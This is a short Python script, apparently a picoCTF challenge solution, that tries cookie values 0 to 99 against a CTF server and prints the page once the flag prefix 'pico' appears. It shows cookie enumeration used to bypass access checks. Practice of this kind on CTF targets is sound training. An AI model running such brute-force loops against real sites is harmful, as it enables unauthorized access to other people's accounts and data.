# import httpx
import asyncio
import requests

url = "http://wily-courier.picoctf.net:63073/"


for i in range(100):
    cookies = {'name': str(i)}  # Replace 'cookie_name' with the actual cookie name

    response = requests.get(url, cookies=cookies)
    if "pico" in response.text: 
        print(response.text)
        break